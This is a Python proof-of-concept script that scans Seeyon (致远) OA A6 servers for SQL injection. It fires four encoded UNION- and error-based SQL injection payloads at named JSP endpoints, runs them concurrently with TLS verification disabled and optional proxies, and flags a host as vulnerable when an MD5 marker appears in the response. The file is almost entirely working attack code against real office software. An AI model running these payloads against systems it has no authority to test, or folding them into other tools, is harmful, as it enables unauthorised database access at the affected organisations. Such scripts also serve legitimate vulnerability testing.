'''
Function:
    致远OA A6 sql注入漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
from gevent.pool import Pool
from gevent.queue import Queue
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.payloads = [
    '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20UnIoN%20SeLeCt%201,2,md5(1234),1%23',
    '/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2%27AnD%20(SeLeCt%201%20FrOm%20(SeLeCt%20CoUnT(*),CoNcaT(Md5(1234),FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.TaBlEs%20GrOuP%20By%20x)a)%23',
    "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'UnIoN%20AlL%20SeLeCt%20NULL,Md5(1234),NULL,NULL%23",
    '/yyoa/ext/trafaxserver/SendFax/resend.jsp?fax_ids=(1)%20AnD%201=2%20UnIon%20SeLeCt%20Md5(1234)%20--',
        ]
        self.text_list = []
        self.q = Queue()
        self.proxies = proxies

    def vuln_path(self):
        for payload in self.payloads:
            self.q.put(payload)
        return True

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, url):
        while True:
            result_text = ""
            if self.q.qsize() == 0:
                break
            payload = self.q.get()
            try:
                url = "{}{}".format(url, payload)
                result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
                if "81dc9bdb52d04dc20036dbd8313ed055" in result.text or "52d04dc20036dbd8" in result.text:
                    target = urlparse(url)
                    result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.text_list.append(result_text)
            except:
                pass

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        pool = Pool(5)
        url = "{}://{}".format(scheme, netloc)
        if self.vuln_path():
            tasks = [pool.spawn(self.vuln, url) for i in range(5)]
            pool.join()
        return self.text_list